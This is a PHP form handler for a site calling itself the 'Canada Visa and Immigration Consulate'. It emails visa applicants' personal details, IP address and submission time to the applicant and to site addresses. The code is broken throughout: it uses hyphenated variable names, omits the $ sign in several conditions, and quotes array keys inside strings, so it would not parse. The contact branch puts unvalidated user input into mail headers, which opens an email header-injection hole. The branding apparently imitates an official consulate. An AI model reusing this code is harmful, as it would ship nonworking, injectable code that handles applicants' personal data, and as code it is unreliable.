<?php

ini_set('display_errors', 1);
error_reporting( E_ALL );

$userIp = $_SERVER['REMOTE_ADDR'];
$ipData = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $userIp));
$userCountry = $ipData->geoplugin_countryName;

date_default_timezone_set('Africa/Lagos');
$dateSubmitted = date('m/d/Y h:i:s a', time());

function getUserOS() { 

	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$os_platform =   "Unknown OS";
	$os_array =   array(
		'/windows nt 10/i'      =>  'Windows 10',
		'/windows nt 6.3/i'     =>  'Windows 8.1',
		'/windows nt 6.2/i'     =>  'Windows 8',
		'/windows nt 6.1/i'     =>  'Windows 7',
		'/windows nt 6.0/i'     =>  'Windows Vista',
		'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
		'/windows nt 5.1/i'     =>  'Windows XP',
		'/windows xp/i'         =>  'Windows XP',
		'/windows nt 5.0/i'     =>  'Windows 2000',
		'/windows me/i'         =>  'Windows ME',
		'/win98/i'              =>  'Windows 98',
		'/win95/i'              =>  'Windows 95',
		'/win16/i'              =>  'Windows 3.11',
		'/macintosh|mac os x/i' =>  'Mac OS X',
		'/mac_powerpc/i'        =>  'Mac OS 9',
		'/linux/i'              =>  'Linux',
		'/ubuntu/i'             =>  'Ubuntu',
		'/iphone/i'             =>  'iPhone',
		'/ipod/i'               =>  'iPod',
		'/ipad/i'               =>  'iPad',
		'/android/i'            =>  'Android',
		'/blackberry/i'         =>  'BlackBerry',
		'/webos/i'              =>  'Mobile'
	);

	foreach ( $os_array as $regex => $value ) { 
		if ( preg_match($regex, $user_agent ) ) {
			$os_platform = $value;
		}
	}   
	return $os_platform;
}

function getUserBrowser() {
	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$browser        = "Unknown Browser";
	$browser_array  = array(
		'/msie/i'       =>  'Internet Explorer',
		'/firefox/i'    =>  'Firefox',
		'/safari/i'     =>  'Safari',
		'/chrome/i'     =>  'Chrome',
		'/edge/i'       =>  'Edge',
		'/opera/i'      =>  'Opera',
		'/netscape/i'   =>  'Netscape',
		'/maxthon/i'    =>  'Maxthon',
		'/konqueror/i'  =>  'Konqueror',
		'/mobile/i'     =>  'Handheld Browser'
	);

	foreach ( $browser_array as $regex => $value ) { 
		if ( preg_match( $regex, $user_agent ) ) {
			$browser = $value;
		}
	}
	return $browser;
}
 

$ex-apply = $_POST['ex-apply'];
$famspo-apply = $_POST['famspo-apply'];
$contact-us = $_POST['contact-us'];
$bv-apply = $_POST['bv-apply'];
$pr-apply = $_POST['pr-apply'];
$sv-apply = $_POST['sv-apply'];
$tv-apply = $_POST['tv-apply'];
$wp-apply = $_POST['wp-apply'];
$wv-apply = $_POST['wv-apply'];


if(isset($_POST['email']) && $_POST['fname'] != ''){
	if($ex-apply == true){

		$sendTo = $_POST['email'];
		$sentFrom ="Canada Visa and Immigration Consulate";
		$subject = "Express Entry Application";
		$headers = "From:" . $sentFrom;   
		$body = "";

		$ourbody = "";

		$body .= "Hello $_POST['fname'], " . "\r\n" . "\r\n";
		$body .= "Here are the details of your express entry application: " . "\r\n" . "\r\n";
		$body .= "First Name: " . $_POST['fname'] . "\r\n";
		$body .= "Last Name: " . $_POST['lname'] . "\r\n";
		$body .= "Email: " . $_POST['email'] . "\r\n";
		$body .= "Age: " . $_POST['age'] . "\r\n";
		$body .= "Language: " . $_POST['language'] . "\r\n";
		$body .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$body .= "Category: " . $_POST['express-category'] . "\r\n";
		$body .= "Country: " . $_POST['country'] . "\r\n";
		$body .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$body .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$client_email = mail($sendTo, $subject, $body, $sentFrom);

		sleep(1);

		$ourbody .= "First Name: " . $_POST['fname'] . "\r\n";
		$ourbody .= "Last Name: " . $_POST['lname'] . "\r\n";
		$ourbody .= "Email: " . $_POST['email'] . "\r\n";
		$ourbody .= "Age: " . $_POST['age'] . "\r\n";
		$ourbody .= "Language: " . $_POST['language'] . "\r\n";
		$ourbody .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$ourbody .= "Category: " . $_POST['express-category'] . "\r\n";
		$ourbody .= "Form Country: " . $_POST['country'] . "\r\n";
		$ourbody .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$ourbody .= "IP: " . $userIp . "\r\n";
		$ourbody .= "Date: " . $dateSubmitted . "\r\n";

		$admin_email = mail("application@canadavisaconsulate.com", $subject, $ourbody);

		if ($client_email==true && $admin_email==true) {
			echo "Application submitted successfully...";
		}else {
			echo "Something went wrong, $_POST['fname']...Try Again!";
		}

		header("Location: home.html");

	} elseif ($famspo-apply==true) {

		$sendTo = $_POST['email'];
		$sentFrom ="Canada Visa and Immigration Consulate";
		$subject = "Family Sponsorship Application";
		$headers = "From:" . $sentFrom;   
		$body = "";

		$ourbody = "";

		$body .= "Hello $_POST['fname'], " . "\r\n" . "\r\n";
		$body .= "Here are the details of your express entry application: " . "\r\n" . "\r\n";
		$body .= "First Name: " . $_POST['fname'] . "\r\n";
		$body .= "Last Name: " . $_POST['lname'] . "\r\n";
		$body .= "Email: " . $_POST['email'] . "\r\n";
		$body .= "Age: " . $_POST['age'] . "\r\n";
		$body .= "Language: " . $_POST['language'] . "\r\n";
		$body .= "Visa Type: " . $_POST['visa-type'] . "\r\n";
		$body .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$body .= "Can you provide for your family? " . $_POST['family-needs'] . "\r\n";
		$body .= "Currently living in Canada? " . $_POST['current-residence'] . "\r\n";
		$body .= "Country: " . $_POST['country'] . "\r\n";
		$body .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$body .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$client_email = mail($sendTo, $subject, $body, $sentFrom);

		sleep(1);

		$ourbody .= "First Name: " . $_POST['fname'] . "\r\n";
		$ourbody .= "Last Name: " . $_POST['lname'] . "\r\n";
		$ourbody .= "Email: " . $_POST['email'] . "\r\n";
		$ourbody .= "Age: " . $_POST['age'] . "\r\n";
		$ourbody .= "Language: " . $_POST['language'] . "\r\n";
		$ourbody .= "Visa Type: " . $_POST['visa-type'] . "\r\n";
		$ourbody .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$ourbody .= "Can you provide for your family? " . $_POST['family-needs'] . "\r\n";
		$ourbody .= "Currently living in Canada? " . $_POST['current-residence'] . "\r\n";
		$ourbody .= "Country: " . $_POST['country'] . "\r\n";
		$ourbody .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$ourbody .= "IP: " . $userIp . "\r\n";
		$ourbody .= "Date: " . $dateSubmitted . "\r\n";

		$admin_email = mail("application@canadavisaconsulate.com", $subject, $ourbody);

		if ($client_email==true && $admin_email==true) {
			echo "Application submitted successfully...";
		}else {
			echo "Something went wrong, $_POST['fname']...Try Again!";
		}
		
		header("Location: home.html");

	} elseif($contact-us==true){
		$sendTo = "contact@canadavisaconsulate.com";
		$sentFrom = $_POST['email'];
		$subject = "Contact Form";
		$headers = "From:" . $sentFrom;   
		$ourbody = "";

		$ourbody .= "First Name: " . $_POST['fname'] . "\r\n";
		$ourbody .= "Last Name: " . $_POST['lname'] . "\r\n";
		$ourbody .= "Email: " . $_POST['email'] . "\r\n";
		$ourbody .= "Phone: " . $_POST['phone'] . "\r\n";
		$ourbody .= "Message: " . $_POST['client-msg'] . "\r\n";

		$admin_email = mail($sendTo, $subject, $ourbody, $headers);

		if ($client_email==true && $admin_email==true) {
			echo "Application submitted successfully...";
		}else {
			echo "Something went wrong, $_POST['fname']...Try Again!";
		}

		header("Location: home.html");

	} elseif(bv-apply==true){
		$sendTo = $_POST['email'];
		$sentFrom ="Canada Visa and Immigration Consulate";
		$subject = "Business Visa Application";
		$headers = "From:" . $sentFrom;   
		$body = "";

		$ourbody = "";

		$body .= "Hello $_POST['fname'], " . "\r\n" . "\r\n";
		$body .= "Here are the details you filled for your Business Visa application: " . "\r\n" . "\r\n";
		$body .= "First Name: " . $_POST['fname'] . "\r\n";
		$body .= "Last Name: " . $_POST['lname'] . "\r\n";
		$body .= "Email: " . $_POST['email'] . "\r\n";
		$body .= "Age: " . $_POST['age'] . "\r\n";
		$body .= "Language: " . $_POST['language'] . "\r\n";
		$body .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$body .= "Country: " . $_POST['country'] . "\r\n";
		$body .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$body .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$client_email = mail($sendTo, $subject, $body, $sentFrom);

		sleep(1);

		$ourbody .= "First Name: " . $_POST['fname'] . "\r\n";
		$ourbody .= "Last Name: " . $_POST['lname'] . "\r\n";
		$ourbody .= "Email: " . $_POST['email'] . "\r\n";
		$ourbody .= "Age: " . $_POST['age'] . "\r\n";
		$ourbody .= "Language: " . $_POST['language'] . "\r\n";
		$ourbody .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$ourbody .= "Country: " . $_POST['country'] . "\r\n";
		$ourbody .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$ourbody .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$admin_email = mail("application@canadavisaconsulate.com", $subject, $ourbody);

		if ($client_email==true && $admin_email==true) {
			echo "Application submitted successfully...";
		}else {
			echo "Something went wrong, $_POST['fname']...Try Again!";
		}

		header("Location: home.html");

	} elseif(pr-apply==true){
		$sendTo = $_POST['email'];
		$sentFrom ="Canada Visa and Immigration Consulate";
		$subject = "Permanent Residence(PR) Visa Application";
		$headers = "From:" . $sentFrom;   
		$body = "";

		$ourbody = "";

		$body .= "Hello $_POST['fname'], " . "\r\n" . "\r\n";
		$body .= "Here are the details you filled for your Permanent Residence(PR) Visa application: " . "\r\n" . "\r\n";
		$body .= "First Name: " . $_POST['fname'] . "\r\n";
		$body .= "Last Name: " . $_POST['lname'] . "\r\n";
		$body .= "Email: " . $_POST['email'] . "\r\n";
		$body .= "Age: " . $_POST['age'] . "\r\n";
		$body .= "Language: " . $_POST['language'] . "\r\n";
		$body .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$body .= "Country: " . $_POST['country'] . "\r\n";
		$body .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$body .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$client_email = mail($sendTo, $subject, $body, $sentFrom);

		sleep(1);

		$ourbody .= "First Name: " . $_POST['fname'] . "\r\n";
		$ourbody .= "Last Name: " . $_POST['lname'] . "\r\n";
		$ourbody .= "Email: " . $_POST['email'] . "\r\n";
		$ourbody .= "Age: " . $_POST['age'] . "\r\n";
		$ourbody .= "Language: " . $_POST['language'] . "\r\n";
		$ourbody .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$ourbody .= "Country: " . $_POST['country'] . "\r\n";
		$ourbody .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$ourbody .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$admin_email = mail("application@canadavisaconsulate.com", $subject, $ourbody);

		if ($client_email==true && $admin_email==true) {
			echo "Application submitted successfully...";
		}else {
			echo "Something went wrong, $_POST['fname']...Try Again!";
		}

		header("Location: home.html");

	} elseif(sv-apply==true){
		$sendTo = $_POST['email'];
		$sentFrom ="Canada Visa and Immigration Consulate";
		$subject = "Study Visa Application";
		$headers = "From:" . $sentFrom;   
		$body = "";

		$ourbody = "";

		$body .= "Hello $_POST['fname'], " . "\r\n" . "\r\n";
		$body .= "Here are the details you filled for your Study Visa application: " . "\r\n" . "\r\n";
		$body .= "First Name: " . $_POST['fname'] . "\r\n";
		$body .= "Last Name: " . $_POST['lname'] . "\r\n";
		$body .= "Email: " . $_POST['email'] . "\r\n";
		$body .= "Age: " . $_POST['age'] . "\r\n";
		$body .= "Language: " . $_POST['language'] . "\r\n";
		$body .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$body .= "Country: " . $_POST['country'] . "\r\n";
		$body .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$body .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$client_email = mail($sendTo, $subject, $body, $sentFrom);

		sleep(1);

		$ourbody .= "First Name: " . $_POST['fname'] . "\r\n";
		$ourbody .= "Last Name: " . $_POST['lname'] . "\r\n";
		$ourbody .= "Email: " . $_POST['email'] . "\r\n";
		$ourbody .= "Age: " . $_POST['age'] . "\r\n";
		$ourbody .= "Language: " . $_POST['language'] . "\r\n";
		$ourbody .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$ourbody .= "Country: " . $_POST['country'] . "\r\n";
		$ourbody .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$ourbody .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$admin_email = mail("application@canadavisaconsulate.com", $subject, $ourbody);

		if ($client_email==true && $admin_email==true) {
			echo "Application submitted successfully...";
		}else {
			echo "Something went wrong, $_POST['fname']...Try Again!";
		}

		header("Location: home.html");

	} elseif(tv-apply==true){
		$sendTo = $_POST['email'];
		$sentFrom ="Canada Visa and Immigration Consulate";
		$subject = "Tourist Visa Application";
		$headers = "From:" . $sentFrom;   
		$body = "";

		$ourbody = "";

		$body .= "Hello $_POST['fname'], " . "\r\n" . "\r\n";
		$body .= "Here are the details you filled for your Tourist Visa application: " . "\r\n" . "\r\n";
		$body .= "First Name: " . $_POST['fname'] . "\r\n";
		$body .= "Last Name: " . $_POST['lname'] . "\r\n";
		$body .= "Email: " . $_POST['email'] . "\r\n";
		$body .= "Age: " . $_POST['age'] . "\r\n";
		$body .= "Language: " . $_POST['language'] . "\r\n";
		$body .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$body .= "Country: " . $_POST['country'] . "\r\n";
		$body .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$body .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$client_email = mail($sendTo, $subject, $body, $sentFrom);

		sleep(1);

		$ourbody .= "First Name: " . $_POST['fname'] . "\r\n";
		$ourbody .= "Last Name: " . $_POST['lname'] . "\r\n";
		$ourbody .= "Email: " . $_POST['email'] . "\r\n";
		$ourbody .= "Age: " . $_POST['age'] . "\r\n";
		$ourbody .= "Language: " . $_POST['language'] . "\r\n";
		$ourbody .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$ourbody .= "Country: " . $_POST['country'] . "\r\n";
		$ourbody .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$ourbody .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$admin_email = mail("application@canadavisaconsulate.com", $subject, $ourbody);

		if ($client_email==true && $admin_email==true) {
			echo "Application submitted successfully...";
		}else {
			echo "Something went wrong, $_POST['fname']...Try Again!";
		}

		header("Location: home.html");

	} elseif(wp-apply==true){
		$sendTo = $_POST['email'];
		$sentFrom ="Canada Visa and Immigration Consulate";
		$subject = "Work Permit Application";
		$headers = "From:" . $sentFrom;   
		$body = "";

		$ourbody = "";

		$body .= "Hello $_POST['fname'], " . "\r\n" . "\r\n";
		$body .= "Here are the details you filled for your Work Permit application: " . "\r\n" . "\r\n";
		$body .= "First Name: " . $_POST['fname'] . "\r\n";
		$body .= "Last Name: " . $_POST['lname'] . "\r\n";
		$body .= "Email: " . $_POST['email'] . "\r\n";
		$body .= "Age: " . $_POST['age'] . "\r\n";
		$body .= "Language: " . $_POST['language'] . "\r\n";
		$body .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$body .= "Country: " . $_POST['country'] . "\r\n";
		$body .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$body .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$client_email = mail($sendTo, $subject, $body, $sentFrom);

		sleep(1);

		$ourbody .= "First Name: " . $_POST['fname'] . "\r\n";
		$ourbody .= "Last Name: " . $_POST['lname'] . "\r\n";
		$ourbody .= "Email: " . $_POST['email'] . "\r\n";
		$ourbody .= "Age: " . $_POST['age'] . "\r\n";
		$ourbody .= "Language: " . $_POST['language'] . "\r\n";
		$ourbody .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$ourbody .= "Country: " . $_POST['country'] . "\r\n";
		$ourbody .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$ourbody .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$admin_email = mail("application@canadavisaconsulate.com", $subject, $ourbody);

		if ($client_email==true && $admin_email==true) {
			echo "Application submitted successfully...";
		}else {
			echo "Something went wrong, $_POST['fname']...Try Again!";
		}

		header("Location: home.html");

	} elseif(wv-apply==true){
		$sendTo = $_POST['email'];
		$sentFrom ="Canada Visa and Immigration Consulate";
		$subject = "Work Visa Application";
		$headers = "From:" . $sentFrom;   
		$body = "";

		$ourbody = "";

		$body .= "Hello $_POST['fname'], " . "\r\n" . "\r\n";
		$body .= "Here are the details you filled for your Work Visa application: " . "\r\n" . "\r\n";
		$body .= "First Name: " . $_POST['fname'] . "\r\n";
		$body .= "Last Name: " . $_POST['lname'] . "\r\n";
		$body .= "Email: " . $_POST['email'] . "\r\n";
		$body .= "Age: " . $_POST['age'] . "\r\n";
		$body .= "Language: " . $_POST['language'] . "\r\n";
		$body .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$body .= "Country: " . $_POST['country'] . "\r\n";
		$body .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$body .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$client_email = mail($sendTo, $subject, $body, $sentFrom);

		sleep(1);

		$ourbody .= "First Name: " . $_POST['fname'] . "\r\n";
		$ourbody .= "Last Name: " . $_POST['lname'] . "\r\n";
		$ourbody .= "Email: " . $_POST['email'] . "\r\n";
		$ourbody .= "Age: " . $_POST['age'] . "\r\n";
		$ourbody .= "Language: " . $_POST['language'] . "\r\n";
		$ourbody .= "First time applying? " . $_POST['first-time'] . "\r\n";
		$ourbody .= "Country: " . $_POST['country'] . "\r\n";
		$ourbody .= "Gender: " . $_POST['gender'] . "\r\n" . "\r\n";
		$ourbody .= "We will review your application and respond to you as soon as possible!" . "\r\n";

		$admin_email = mail("application@canadavisaconsulate.com", $subject, $ourbody);

		if ($client_email==true && $admin_email==true) {
			echo "Application submitted successfully...";
		}else {
			echo "Something went wrong, $_POST['fname']...Try Again!";
		}

		header("Location: home.html");

	}

}

sleep(3);

header("Location: home.html");
?>